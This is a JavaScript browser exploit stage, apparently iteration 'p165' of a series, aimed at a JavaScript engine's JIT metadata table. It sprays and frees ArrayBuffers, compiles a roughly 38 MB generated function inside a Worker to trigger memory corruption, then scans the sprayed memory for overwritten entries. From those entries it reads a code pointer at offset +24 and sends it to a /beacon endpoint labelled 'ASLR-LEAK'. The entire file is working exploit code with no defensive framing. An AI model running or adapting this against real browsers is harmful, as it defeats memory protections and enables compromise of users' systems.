// p165 -- MetadataTable Worker sweep + ASLR thunk pointer extraction
// Builds on p163 approach: Worker-isolated compile+call, main-thread spray scan
// Specifically extracts m_slowPathCallDestination at +24 in each 112-byte metadata entry
// Beacon prefix: V165-
if (window.__p165_loaded) return;
window.__p165_loaded = true;
(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V165-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send(body || '');
    } catch(e) {}
  }
  function hexBytes(view, off, len) {
    var s = '';
    for (var i = 0; i < len && (off + i) < view.length; i++) {
      var h = view[off + i].toString(16);
      s += (h.length < 2 ? '0' : '') + h;
    }
    return s;
  }

  B('BOOT');

  var STRIDE = 112;
  var BUF_SZ = 100112;
  var TOTAL = 600;
  var bufs = new Array(TOTAL);
  var views = [];

  for (var i = 0; i < TOTAL; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY-' + TOTAL);

  for (var i = 1; i < TOTAL; i += 2) {
    var v = new Uint8Array(bufs[i]);
    for (var j = 0; j < BUF_SZ; j++) v[j] = 0xAA;
    views.push({idx: i, view: v});
  }
  B('MARKED-' + views.length);

  var freed = 0;
  for (var i = 0; i < TOTAL; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      freed++;
    } catch(e) {}
    bufs[i] = null;
  }
  bufs = null;
  B('FREED-' + freed);

  setTimeout(function() {
    for (var g = 0; g < 30; g++) {
      var junk = [];
      for (var j = 0; j < 100000; j++) junk.push({x: j, y: j * 2});
      junk = null;
    }
    B('GC-DONE');

    var chunk = 'a();a();a();a();a();a();a();a();a();a();';
    var big = '';
    for (var k = 0; k < 1000; k++) big += chunk;
    var src = 'self.__p165fn=function(a){';
    var parts = [src];
    for (var k = 0; k < 3834; k++) parts.push(big);
    var rem = 38348816 - 38340000;
    var remStr = '';
    for (var k = 0; k < rem; k++) remStr += 'a();';
    parts.push(remStr);
    parts.push('};self.postMessage("COMPILED");');

    var fnBlob = new Blob(parts, {type: 'application/javascript'});
    B('FNBLOB-' + Math.round(fnBlob.size / 1048576) + 'MB');
    parts = null; big = null;
    var fnUrl = URL.createObjectURL(fnBlob);

    var wCode = [
      'importScripts("' + fnUrl + '");',
      'self.postMessage("CALLING");',
      'var t0 = Date.now();',
      'try {',
      '  self.__p165fn(function() { throw "V165STOP"; });',
      '} catch(e) {',
      '  self.postMessage("SURVIVED-" + (Date.now() - t0) + "ms");',
      '}',
      'self.postMessage("DONE");'
    ].join('\n');

    var wBlob = new Blob([wCode], {type: 'application/javascript'});
    var wUrl = URL.createObjectURL(wBlob);

    B('WORKER-LAUNCH');
    var w = new Worker(wUrl);
    var workerDead = false;
    var workerMsgs = [];

    w.onmessage = function(e) {
      workerMsgs.push(String(e.data));
      B('WMSG-' + String(e.data).substring(0, 40));
    };
    w.onerror = function(e) {
      workerDead = true;
      B('WERR-' + (e.message || 'unknown').substring(0, 40));
    };

    var checkCount = 0;
    var checkInterval = setInterval(function() {
      checkCount++;
      var compiled = workerMsgs.indexOf('COMPILED') >= 0;
      var calling = workerMsgs.indexOf('CALLING') >= 0;
      var survived = false;
      for (var m = 0; m < workerMsgs.length; m++) {
        if (workerMsgs[m].indexOf('SURVIVED') === 0) survived = true;
      }
      var done = workerMsgs.indexOf('DONE') >= 0;

      if (done || workerDead || survived || checkCount > 120) {
        clearInterval(checkInterval);
        B('WSTATUS-C' + (compiled?1:0) + '-K' + (calling?1:0) + '-S' + (survived?1:0) + '-D' + (done?1:0) + '-E' + (workerDead?1:0));

        var hitViews = [];
        for (var i = 0; i < views.length; i++) {
          var v = views[i].view;
          for (var j = 0; j < 112; j++) {
            if (v[j] !== 0xAA) {
              hitViews.push(views[i]);
              break;
            }
          }
        }
        B('HIT-' + hitViews.length + '-OF-' + views.length);

        if (hitViews.length === 0) {
          B('MISS');
          return;
        }

        // For each hit buffer, find first entry boundary and extract thunk pointer
        var ptrs = [];
        for (var h = 0; h < hitViews.length && h < 5; h++) {
          var v = hitViews[h].view;
          var bufIdx = hitViews[h].idx;
          // Find first non-0xAA position (entry start)
          var entryStart = -1;
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== 0xAA) { entryStart = j; break; }
          }
          if (entryStart < 0) continue;

          // Align to STRIDE boundary relative to entryStart
          // Read thunk pointer at entryStart + 24 (m_slowPathCallDestination)
          var ptrOff = entryStart + 24;
          if (ptrOff + 8 > v.length) continue;

          // Read 8 bytes little-endian as hex
          var ptrHex = '';
          for (var b = 7; b >= 0; b--) {
            var hx = v[ptrOff + b].toString(16);
            ptrHex += (hx.length < 2 ? '0' : '') + hx;
          }
          ptrs.push(ptrHex);

          // Beacon: first 112 bytes from entry start
          var entryHex = hexBytes(v, entryStart, STRIDE);
          B('ENTRY-B' + bufIdx + '-OFF' + entryStart, entryHex);
          B('PTR-B' + bufIdx + '-' + ptrHex);

          // Also check subsequent entries at +STRIDE intervals
          for (var e = 1; e < 4; e++) {
            var nextOff = entryStart + e * STRIDE + 24;
            if (nextOff + 8 > v.length) break;
            var nextPtr = '';
            for (var b = 7; b >= 0; b--) {
              var hx = v[nextOff + b].toString(16);
              nextPtr += (hx.length < 2 ? '0' : '') + hx;
            }
            if (nextPtr !== ptrHex && nextPtr !== 'aaaaaaaaaaaaaaaa') {
              B('PTR' + e + '-B' + bufIdx + '-' + nextPtr);
            }
          }

          // Extract m_bytecodeIndex at entry+68 (4 bytes LE) to verify structure
          var idxOff = entryStart + 68;
          if (idxOff + 4 <= v.length) {
            var bcIdx = v[idxOff] | (v[idxOff+1] << 8) | (v[idxOff+2] << 16) | ((v[idxOff+3] << 24) >>> 0);
            B('BCIDX-B' + bufIdx + '-' + bcIdx);
          }
        }

        // Deduplicate pointers and find the most common (the real thunk addr)
        if (ptrs.length > 0) {
          var best = ptrs[0];
          B('ASLR-LEAK-' + best);
        }

        B('DONE');
      }
    }, 500);
  }, 500);
})();
